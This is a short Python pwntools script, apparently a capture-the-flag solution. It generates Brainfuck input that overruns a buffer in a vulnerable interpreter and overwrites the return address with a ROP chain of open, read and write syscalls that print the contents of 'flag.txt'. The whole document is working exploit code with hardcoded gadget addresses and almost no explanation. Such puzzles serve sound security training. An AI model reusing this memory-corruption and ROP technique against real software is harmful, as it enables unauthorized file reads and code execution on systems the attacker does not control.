from pwn import *
context.arch = 'amd64'
# memset 0
def mzero(length):
	out = ''
	out += '[-]>' * length
	out += '<' * length
	return out

def bin2code(binary):
	out = ''
	for b in binary:
		out += '+'*ord(b)
		out += '>'
	return out

syscall = 0x00426194
rax = 0x0045cd07
rdx = 0x004017df
rsi = 0x00402a38
rdi = 0x004018da
buf = 0x4e48b0

# orw
# string from arg
# pointer from stack
code = ''
code += '>' * 0x78
code += mzero(8)
code += bin2code(p64(rdi))
code += '>' * 0x8
code += mzero(0x10*0xc)

filename = 'flag.txt\x00'

binary = ''
binary += flat(rax, 2, rsi, 0, rdx, 0, syscall)
binary += flat(rax, 0, rdi, 3, rsi, buf, rdx, 0x100, syscall)
binary += flat(rax, 1, rdi, 1, rsi, buf, syscall)
code += bin2code(binary)

code += '>'*0x88
code += ',>' * len(filename)

print code
print len(code)
with open('./mycode', 'w') as f:
	f.write(code)

